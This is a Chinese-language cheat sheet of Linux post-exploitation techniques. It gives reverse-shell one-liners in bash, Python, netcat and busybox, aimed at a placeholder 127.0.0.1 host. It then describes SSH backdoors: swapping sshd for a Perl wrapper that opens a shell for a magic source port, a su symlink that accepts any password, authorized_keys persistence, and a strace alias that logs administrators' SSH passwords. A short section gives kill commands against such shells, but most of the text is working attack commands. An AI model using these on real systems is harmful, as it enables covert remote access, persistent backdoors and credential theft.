# 弹shell
```
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

# 一般Netcat有两个版本，一个版本是不提供反向连接的版本，一个是全功能版本。这两者的区别就是是否带-e参数，只有带-e参数的版本才支持反向连接。ubuntu 18.04安装的是不提供反向链接的版本。

nc -e /bin/bash 127.0.0.1 6666
# 阉割版nc
nc 127.0.0.1 6666|/bin/bash|nc 127.0.0.1 7777
mkfifo /tmp/backpipe1 | /bin/sh 0</tmp/backpipe1 | /bin/busybox nc 127.0.0.1 6666 1>/tmp/backpipe1
```



## 应对方法
批量kill可以进程
```sh
ps -ef |grep "python" |awk '{print $2}'|xargs kill -9
ps -ef |grep "bash -i" |awk '{print $2}'|xargs kill -9
ps -ef |grep "ew" |awk '{print $2}'|xargs kill -9
```
# ssh后门
## 替换sshd
判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中
```sh
cd /usr/sbin/
mv sshd ../bin
vim sshd # 编辑sshd内容为以下
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..LF/); # \x00\x00LF是19526的大端形式
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
service sshd restart
```
```sh 
socat STDIO TCP4:127.0.0.1:22,sourceport=19265
```
## su后门
  软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），然而su在pam_rootok只检测uid 0即可认证成功，这样就导致了可以使用任意密码登录
```
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=888
```
## ssh 免密登录
公钥写入`.ssh/authorized_keys`

## strace抓取管理员密码
```
alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
ps -ef | grep sshd

```